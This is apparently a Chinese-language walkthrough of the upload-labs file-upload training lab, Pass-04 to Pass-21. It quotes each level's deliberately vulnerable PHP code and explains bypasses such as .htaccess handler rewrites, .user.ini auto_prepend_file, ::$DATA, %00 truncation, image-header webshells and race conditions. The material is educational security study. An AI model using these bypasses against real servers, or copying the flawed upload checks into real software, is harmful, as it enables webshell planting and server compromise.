array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".php1\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".pHp1\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".ini\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //收尾去空 if (!in_array($file_ext, $deny_ext)) { $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { $msg = '上传出错！'; } } else { $msg = '此文件不允许上传!'; } } else { $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; } } 这里可以看到黑名单过滤的更多了，能过滤的几乎都过滤了，但却没有过滤.htaccess与.user.ini后缀 而这里用到的是.htaccess： htaccess文件(或者”分布式配置文件”）,全称是Hypertext Access(超文本入口)。提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。 启用.htaccess，需要修改httpd.conf，启用AllowOverride，并可以用AllowOverride限制特定命令的使用。如果需要使用.htaccess以外的其他文件名，可以用AccessFileName指令来改变。例如，需要使用.config ，则可以在服务器配置文件中按以下方法配置：AccessFileName .config 。 它里面有这样一段代码：AllowOverride None，我们把None改成All .htaccess可以帮我们实现包括：文件夹密码保护、用户自动重定向、自定义错误页面、改变你的文件扩展名、封禁特定IP地址的用户、只允许特定IP地址的用户、禁止目录列表，以及使用其他文件作为index文件等一些功能。 首先写一个.htaccess，内容如下，他会将后缀名为jpg的文件当作php文件解析，于是我们将木马文件后缀名改为jpg即可 &lt;FilesMatch \"jpg\"&gt; SetHandler application/x-httpd-php &lt;/FilesMatch&gt; 或 AddType application/x-httpd-php .jpg 上传成功 Pass-05 $is_upload = false; $msg = null; if (isset($_POST['submit'])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) { $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { $msg = '上传出错！'; } } else { $msg = '此文件类型不允许上传！'; } } else { $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; } } 可以看到过滤了.htaccess，但我们可以利用.user.ini后缀： php.ini 是 php的配置文件，.user.ini 中的字段也会被 php 视为配置文件来处理，从而导致 php 的文件解析漏洞。但是想要引发 .user.ini 解析漏洞需要三个前提条件 服务器脚本语言为PHP 已满足 服务器使用CGI／FastCGI模式 上传目录下要有可执行的php文件 已满足 首先调整为 FastCGI 模式（切换版本中切换到5.3.29-nts+Nginx） 创建一个.user.ini文件 auto_prepend_file=1.jpg .user.ini文件里的意思是：所有的php文件都自动包含1.jpg文件。.user.ini相当于一个用户自定义的php.ini 首先上传.user.ini auto_prepend_file=1.jpg .user.ini文件里的意思是：所有的php文件都自动包含1.jpg文件。.user.ini相当于一个用户自定义的php.ini 首先上传.user.ini，在上传1.jpg会发现解析图片错误，是因为只有在访问 php 文件时，才会自动包含 shell.jpg ，所以作者给了提示在上传目录下是有一个 readme.php 文件的，所以直接访问此文件就可以包含上传的 shell 了 因为php会自动包含1.jpg，那么文件里面的内容就会被当做php代码而执行。我们只需要在包含的文件写上一句话木马即可 接下来如果直接上传shell.bcx之后，如果你想直接访问该文件会报错，这是因为只有在访问PHP文件的时候，才会自动包含shell.bcx，根据提示，我们知道上传目录下存在redeme.php文件 上传木马后，我们进入上传目录访问redeme.php文件即可 上传成功 Pass-06 $is_upload = false; $msg = null; if (isset($_POST['submit'])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\",\".ini\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) { $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { $msg = '上传出错！'; } } else { $msg = '此文件类型不允许上传！'; } } else { $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; } } 这里看到又过滤了.ini后缀，但这里却忘记过滤大小写了，修改后缀名为Php即可 Pass-07 $is_upload = false; $msg = null; if (isset($_POST['submit'])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\",\".ini\"); $file_name = $_FILES['upload_file']['name']; $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA if (!in_array($file_ext, $deny_ext)) { $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file,$img_path)) { $is_upload = true; } else { $msg = '上传出错！'; } } else { $msg = '此文件不允许上传'; } } else { $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; } } 与上一关对比发现，没有过滤空格，我们在php后缀添加空格即可绕过 Pass-08 $is_upload = false; $msg = null; if (isset($_POST['submit'])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\",\".ini\"); $file_name = trim($_FILES['upload_file']['name']); $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) { $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { $msg = '上传出错！'; } } else { $msg = '此文件类型不允许上传！'; } } else { $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; } } 对比发现这里没有删除文件末尾的点，我们在php后面添加.即可 Pass-09 $is_upload = false; $msg = null; if (isset($_POST['submit'])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\",\".ini\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) { $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { $msg = '上传出错！'; } } else { $msg = '此文件类型不允许上传！'; } } else { $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; } } 对比发现，这一关没有过滤::$DATA，具体的含义可以参考：::$DATA在文件解析漏洞中的妙用 ::$DATA属性可以被恶意攻击者利用来隐藏恶意代码或数据。这种漏洞通常发生在应用程序或操作系统对文件解析和处理的过程中，攻击者通过构造特定的文件名或路径，使得应用程序在解析文件时错误地将::$DATA属性作为文件名的一部分，从而导致恶意代码或数据被执行或读取。 在php+windows的情况下：如果文件名+“::$DATA\"会把::$DATA之后的数据当成文件流处理,不会检测后缀名.且保持”::$DATA\"之前的文件名。利用windows特性，可在后缀名中加” ::$DATA”绕过： 这里我们在上传文件后缀添加::$DATA即可，上传之后，访问即可 tips： ::$DATA属性对于普通用户来说是隐藏的 通常只有系统和一些特定的程序才能访问和使用它 对于普通用户来说 文件的数据是通过文件名来访问和操作的 而不需要直接访问::$DATA属性 Pass-10 $is_upload = false; $msg = null; if (isset($_POST['submit'])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\",\".ini\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) { $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { $msg = '上传出错！'; } } else { $msg = '此文件类型不允许上传！'; } } else { $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; } } 这一关涉及到了deldot函数特性： deldot()函数从后向前检测，当检测到末尾的第一个点时会继续它的检测，但是遇到空格会停下来 我们利用该函数的特性修改后缀名为php. .这样最终执行完的结果为php.，成功绕过，我们进行抓包验证 Pass-11 $is_upload = false; $msg = null; if (isset($_POST['submit'])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(\"php\",\"php5\",\"php4\",\"php3\",\"php2\",\"html\",\"htm\",\"phtml\",\"pht\",\"jsp\",\"jspa\",\"jspx\",\"jsw\",\"jsv\",\"jspf\",\"jtml\",\"asp\",\"aspx\",\"asa\",\"asax\",\"ascx\",\"ashx\",\"asmx\",\"cer\",\"swf\",\"htaccess\",\"ini\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = str_ireplace($deny_ext,\"\", $file_name); $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { $msg = '上传出错！'; } } else { $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; } } 重点观察$file_name = str_ireplace($deny_ext,\"\", $file_name);即可知道双写绕过即可 Pass-12 $is_upload = false; $msg = null; if(isset($_POST['submit'])){ $ext_arr = array('jpg','png','gif'); $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],\".\")+1); if(in_array($file_ext,$ext_arr)){ $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = $_GET['save_path'].\"/\".rand(10, 99).date(\"YmdHis\").\".\".$file_ext; if(move_uploaded_file($temp_file,$img_path)){ $is_upload = true; } else { $msg = '上传出错！'; } } else{ $msg = \"只允许上传.jpg|.png|.gif类型文件！\"; } } 这关查看源码发现对上传格式做了限制，这时想要绕过需要%00 例如：我们上传 1.php%00.jpg 时，首先后缀名是合法的jpg格式，可以绕过前端的检测。上传到后端后，后端判断文件名后缀的函数会认为其是一个.jpg格式的文件，可以躲过白名单检测。但是在保存文件时，保存文件时处理文件名的函数在遇到%00字符认为这是终止符，于是丢弃后面的 .jpg，于是我们上传的 1.php%00.jpg 文件最终会被写入 1.php 文件中并存储在服务端。 1.php&lt;5.3.4，并且关闭magic_quotes_gpc 2.文件上传路径可控 Pass-13 $is_upload = false; $msg = null; if(isset($_POST['submit'])){ $ext_arr = array('jpg','png','gif'); $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],\".\")+1); if(in_array($file_ext,$ext_arr)){ $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = $_POST['save_path'].\"/\".rand(10, 99).date(\"YmdHis\").\".\".$file_ext; if(move_uploaded_file($temp_file,$img_path)){ $is_upload = true; } else { $msg = \"上传失败\"; } } else { $msg = \"只允许上传.jpg|.png|.gif类型文件！\"; } } 与上一关类似，只不过这一关是在post上面进行00截断 注意：当url中的参数是通过GET方式获取时，%00会被自动解码。而当参数是通过POST方式获取时，是不会自动解码的，也就是说%00只会原样被当成字符串来输出。所以通过POST方式请求此类参数的时候，我们需要手动将它的十六进制改写为0x00 Pass-14 function getReailFileType($filename){ $file = fopen($filename, \"rb\"); $bin = fread($file, 2); //只读2字节 fclose($file); $strInfo = @unpack(\"C2chars\", $bin); $typeCode = intval($strInfo['chars1'].$strInfo['chars2']); $fileType = ''; switch($typeCode){ case 255216: $fileType = 'jpg'; break; case 13780: $fileType = 'png'; break; case 7173: $fileType = 'gif'; break; default: $fileType = 'unknown'; } return $fileType; } $is_upload = false; $msg = null; if(isset($_POST['submit'])){ $temp_file = $_FILES['upload_file']['tmp_name']; $file_type = getReailFileType($temp_file); if($file_type == 'unknown'){ $msg = \"文件未知，上传失败！\"; }else{ $img_path = UPLOAD_PATH.\"/\".rand(10, 99).date(\"YmdHis\").\".\".$file_type; if(move_uploaded_file($temp_file,$img_path)){ $is_upload = true; } else { $msg = \"上传出错！\"; } } } 这一关的校验代码：通过读文件的前2个字节判断文件类型，因此直接上传图片马即可，制作图片马： cmd：copy 图片文件名/b + 一句话木马文件名/a 制作的图片马文件名 制作好，打开之后如下图，说明制作成功 接下来我们用它的自带的文件包含漏洞解析该图片： http://127.0.0.1/upload-labs/include.php?file=upload/1020230201072203.jpg Pass-15 function isImage($filename){ $types = '.jpeg|.png|.gif'; if(file_exists($filename)){ $info = getimagesize($filename); $ext = image_type_to_extension($info[2]); if(stripos($types,$ext)&gt;=0){ return $ext; }else{ return false; } }else{ return false; } } $is_upload = false; $msg = null; if(isset($_POST['submit'])){ $temp_file = $_FILES['upload_file']['tmp_name']; $res = isImage($temp_file); if(!$res){ $msg = \"文件未知，上传失败！\"; }else{ $img_path = UPLOAD_PATH.\"/\".rand(10, 99).date(\"YmdHis\").$res; if(move_uploaded_file($temp_file,$img_path)){ $is_upload = true; } else { $msg = \"上传出错！\"; } } } 这一关采用了getimagesize函数校验：对目标文件的16进制去进行一个读取，去读取头几个字符串是不是符合图片的要求的，同上一关步骤一样。当然也可以直接抓包，在文件内容前面添加指定类型的文件头如：GIF89a等等 Pass-16 function isImage($filename){ //需要开启php_exif模块 $image_type = exif_imagetype($filename); switch ($image_type) { case IMAGETYPE_GIF: return \"gif\"; break; case IMAGETYPE_JPEG: return \"jpg\"; break; case IMAGETYPE_PNG: return \"png\"; break; default: return false; break; } } $is_upload = false; $msg = null; if(isset($_POST['submit'])){ $temp_file = $_FILES['upload_file']['tmp_name']; $res = isImage($temp_file); if(!$res){ $msg = \"文件未知，上传失败！\"; }else{ $img_path = UPLOAD_PATH.\"/\".rand(10, 99).date(\"YmdHis\").\".\".$res; if(move_uploaded_file($temp_file,$img_path)){ $is_upload = true; } else { $msg = \"上传出错！\"; } } } 这一关采用了exif_imagetype函数来校验： exif_imagetype()读取一个图像的第一个字节并检查其后缀名。 返回值与getimage()函数返回的索引2相同，但是速度比getimage快得多。需要开启`php_exif`模块 与上一关步骤相同 Pass-17 $is_upload = false; $msg = null; if (isset($_POST['submit'])){ // 获得上传文件的基本信息，文件名，类型，大小，临时文件路径 $filename = $_FILES['upload_file']['name']; $filetype = $_FILES['upload_file']['type']; $tmpname = $_FILES['upload_file']['tmp_name']; $target_path=UPLOAD_PATH.'/'.basename($filename); // 获得上传文件的扩展名 $fileext= substr(strrchr($filename,\".\"),1); //判断文件后缀与类型，合法才进行上传操作 if(($fileext == \"jpg\") &amp;&amp; ($filetype==\"image/jpeg\")){ if(move_uploaded_file($tmpname,$target_path)){ //使用上传的图片生成新的图片 $im = imagecreatefromjpeg($target_path); if($im == false){ $msg = \"该文件不是jpg格式的图片！\"; @unlink($target_path); }else{ //给新图片指定文件名 srand(time()); $newfilename = strval(rand()).\".jpg\"; //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = UPLOAD_PATH.'/'.$newfilename; imagejpeg($im,$img_path); @unlink($target_path); $is_upload = true; } } else { $msg = \"上传出错！\"; } }else if(($fileext == \"png\") &amp;&amp; ($filetype==\"image/png\")){ if(move_uploaded_file($tmpname,$target_path)){ //使用上传的图片生成新的图片 $im = imagecreatefrompng($target_path); if($im == false){ $msg = \"该文件不是png格式的图片！\"; @unlink($target_path); }else{ //给新图片指定文件名 srand(time()); $newfilename = strval(rand()).\".png\"; //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = UPLOAD_PATH.'/'.$newfilename; imagepng($im,$img_path); @unlink($target_path); $is_upload = true; } } else { $msg = \"上传出错！\"; } }else if(($fileext == \"gif\") &amp;&amp; ($filetype==\"image/gif\")){ if(move_uploaded_file($tmpname,$target_path)){ //使用上传的图片生成新的图片 $im = imagecreatefromgif($target_path); if($im == false){ $msg = \"该文件不是gif格式的图片！\"; @unlink($target_path); }else{ //给新图片指定文件名 srand(time()); $newfilename = strval(rand()).\".gif\"; //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = UPLOAD_PATH.'/'.$newfilename; imagegif($im,$img_path); @unlink($target_path); $is_upload = true; } } else { $msg = \"上传出错！\"; } }else{ $msg = \"只允许上传后缀为.jpg|.png|.gif的图片文件！\"; } } 补充知识： 二次渲染：后端重写文件内容 basename(path[,suffix]) ，没指定suffix则返回后缀名，有则不返回指定的后缀名 strrchr(string,char)函数查找字符串在另一个字符串中最后一次出现的位置，并返回从该位置到字符串 结尾的所有字符。 imagecreatefromgif()：创建一块画布，并从GIF文件或URL地址载入一副图像 imagecreatefromjpeg()：创建一块画布，并从JPEG文件或URL地址载入一副图像 imagecreatefrompng()：创建一块画布，并从PNG文件或URL imagecreatefromgif()函数：相当于创建一个新图像 unlink()函数：删除文件（前面的@表示不显示可能出现的错误） strval()函数：用于获取变量的字符串值。 imagegif()函数：以 GIF 格式将图像输出到浏览器或文件 总结：如果我们上传的是gif图像，这里会重新生成一个图像，并且随机文件名。在返回图像到浏览器后，就删除图像。也就是二次渲染 关于绕过gif的二次渲染，我们只需要找到渲染前后没有变化的位置，然后将php代码写进去，就可以成功上传带有php代码的图片了。 我们可以依旧制作图片马，接着上传之后，将服务器上的最终的图片马下载下来，两者对比，在内容没有发生变化的地方添加一句话木马即可 Pass-18 $is_upload = false; $msg = null; if(isset($_POST['submit'])){ $ext_arr = array('jpg','png','gif'); $file_name = $_FILES['upload_file']['name']; $temp_file = $_FILES['upload_file']['tmp_name']; $file_ext = substr($file_name,strrpos($file_name,\".\")+1); $upload_file = UPLOAD_PATH . '/' . $file_name; if(move_uploaded_file($temp_file, $upload_file)){ if(in_array($file_ext,$ext_arr)){ $img_path = UPLOAD_PATH . '/'. rand(10, 99).date(\"YmdHis\").\".\".$file_ext; rename($upload_file, $img_path); $is_upload = true; }else{ $msg = \"只允许上传.jpg|.png|.gif类型文件！\"; unlink($upload_file); } }else{ $msg = '上传出错！'; } } 这里可以上传图片马。也有条件竞争： 注意关键函数unlink函数，由于这里的代码逻辑是，不论什么文件，先上传后判断，接着如果文件后缀不符合规定再决定是否删除。 但如果我们在文件删除之前就读取到该文件，那文件就不能被正常删除了：直接上传1.php，使用Burp拦截 如上图进行修改后，我们先正常上传图片，复制以下图片的路径，方便后续的访问。 在bp开始attack之后，我们不断的execute去访问上传的文件即可 Pass-19 //index.php $is_upload = false; $msg = null; if (isset($_POST['submit'])) { require_once(\"./myupload.php\"); $imgFileName =time(); $u = new MyUpload($_FILES['upload_file']['name'], $_FILES['upload_file']['tmp_name'], $_FILES['upload_file']['size'],$imgFileName); $status_code = $u-&gt;upload(UPLOAD_PATH); switch ($status_code) { case 1: $is_upload = true; $img_path = $u-&gt;cls_upload_dir . $u-&gt;cls_file_rename_to; break; case 2: $msg = '文件已经被上传，但没有重命名。'; break; case -1: $msg = '这个文件不能上传到服务器的临时文件存储目录。'; break; case -2: $msg = '上传失败，上传目录不可写。'; break; case -3: $msg = '上传失败，无法上传该类型文件。'; break; case -4: $msg = '上传失败，上传的文件过大。'; break; case -5: $msg = '上传失败，服务器已经存在相同名称文件。'; break; case -6: $msg = '文件无法上传，文件不能复制到目标目录。'; break; default: $msg = '未知错误！'; break; } } //myupload.php class MyUpload{ ...... ...... ...... var $cls_arr_ext_accepted = array( \".doc\", \".xls\", \".txt\", \".pdf\", \".gif\", \".jpg\", \".zip\", \".rar\", \".7z\",\".ppt\", \".html\", \".xml\", \".tiff\", \".jpeg\", \".png\" ); ...... ...... ...... /** upload() ** ** Method to upload the file. ** This is the only method to call outside the class. ** @para String name of directory we upload to ** @returns void **/ function upload( $dir ){ $ret = $this-&gt;isUploadedFile(); if( $ret != 1 ){ return $this-&gt;resultUpload( $ret ); } $ret = $this-&gt;setDir( $dir ); if( $ret != 1 ){ return $this-&gt;resultUpload( $ret ); } $ret = $this-&gt;checkExtension(); if( $ret != 1 ){ return $this-&gt;resultUpload( $ret ); } $ret = $this-&gt;checkSize(); if( $ret != 1 ){ return $this-&gt;resultUpload( $ret ); } // if flag to check if the file exists is set to 1 if( $this-&gt;cls_file_exists == 1 ){ $ret = $this-&gt;checkFileExists(); if( $ret != 1 ){ return $this-&gt;resultUpload( $ret ); } } // if we are here, we are ready to move the file to destination $ret = $this-&gt;move(); if( $ret != 1 ){ return $this-&gt;resultUpload( $ret ); } // check if we need to rename the file if( $this-&gt;cls_rename_file == 1 ){ $ret = $this-&gt;renameFile(); if( $ret != 1 ){ return $this-&gt;resultUpload( $ret ); } } // if we are here, everything worked as planned :) return $this-&gt;resultUpload( \"SUCCESS\" ); } ...... ...... ...... }; 分析：本Pass做了白名单校验，文件上传后先保存在对象中，随后对文件进行判断存在、检查扩展名、检查大小、重命名、移动操作，没有判断文件头和二次渲染。我们可以使用图片木马配合文件包含漏洞进行绕过。（虽然进行了移动和重命名，但是网页会回显地址）上传，随后使用文件包含漏洞访问该文件 Pass-20 $is_upload = false; $msg = null; if (isset($_POST['submit'])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(\"php\",\"php5\",\"php4\",\"php3\",\"php2\",\"html\",\"htm\",\"phtml\",\"pht\",\"jsp\",\"jspa\",\"jspx\",\"jsw\",\"jsv\",\"jspf\",\"jtml\",\"asp\",\"aspx\",\"asa\",\"asax\",\"ascx\",\"ashx\",\"asmx\",\"cer\",\"swf\",\"htaccess\"); $file_name = $_POST['save_name']; $file_ext = pathinfo($file_name,PATHINFO_EXTENSION); if(!in_array($file_ext,$deny_ext)) { $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH . '/' .$file_name; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; }else{ $msg = '上传出错！'; } }else{ $msg = '禁止保存为该类型文件！'; } } else { $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; } } pathinfo() 函数以数组的形式返回关于文件路径的信息，返回的数组元素如下： [dirname]: 目录路径 [basename]: 文件名 [extension]: 文件后缀名 [filename]: 不包含后缀的文件名 这一关只检查了文件后缀名，且没有限制大小写。很容易绕过 这关也可以直接利用文件包含漏洞上传图片马 利用%00截断绕过（注意版本） move_uploaded_file()有这么一个特性，会忽略掉文件末尾的 /.（可以在后缀名添加/.即可绕过黑名单） Pass-21 $is_upload = false; $msg = null; if(!empty($_FILES['upload_file'])){ //检查MIME $allow_type = array('image/jpeg','image/png','image/gif'); if(!in_array($_FILES['upload_file']['type'],$allow_type)){ $msg = \"禁止上传该类型文件!\"; }else{ //检查文件名 $file = empty($_POST['save_name']) ? $_FILES['upload_file']['name'] : $_POST['save_name']; if (!is_array($file)) { $file = explode('.', strtolower($file)); } $ext = end($file); $allow_suffix = array('jpg','png','gif'); if (!in_array($ext, $allow_suffix)) { $msg = \"禁止上传该后缀文件!\"; }else{ $file_name = reset($file) . '.' . $file[count($file) - 1]; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH . '/' .$file_name; if (move_uploaded_file($temp_file, $img_path)) { $msg = \"文件上传成功！\"; $is_upload = true; } else { $msg = \"文件上传失败！\"; } } } }else{ $msg = \"请选择要上传的文件！\"; } 关键函数： count() 函数返回数组中元素的数目 reset() 函数将内部指针指向数组中的第一个元素，并输出。 end() 函数将内部指针指向数组中的最后一个元素，并输出。 explode() 函数使用一个字符串分割另一个字符串，并返回由字符串组成的数组。 这关可以直接修改mime类型为白名单中的某一个，放包上传，然后利用文件包含漏洞进行验证即可 审计代码，这关的关键部分为判断file是否是一个数组 不是数组必定会经历打散为数组的过程 而最终的文件名后缀取的是$file[count($file) - 1]，因此我们可以让$file为数组。 设置file[0]为1.php/.，而file[2]设置为jpg（也就是白名单中的某一个）file[1]为空，这样最终结果为 后缀名为jpg（由于end函数的判断），而$file[count($file) - 1]=$file[1]为空，file_name为1.php/.，经过move_uploaded_file()的特性，最终上传为1.php 上传成功 0x03 Xss-lab level-1 &lt;title&gt;欢迎来到level1&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;h1 align=center&gt;欢迎来到level1&lt;/h1&gt; &lt;?php ini_set(\"display_errors\", 0); $str = $_GET[\"name\"]; echo \"&lt;h2 align=center&gt;欢迎用户\".$str.\"&lt;/h2&gt;\"; ?&gt; &lt;center&gt;&lt;img src=level1.png&gt;&lt;/center&gt; &lt;?php echo \"&lt;h3 align=center&gt;payload的长度:\".strlen($str).\"&lt;/h3&gt;\"; ?&gt; 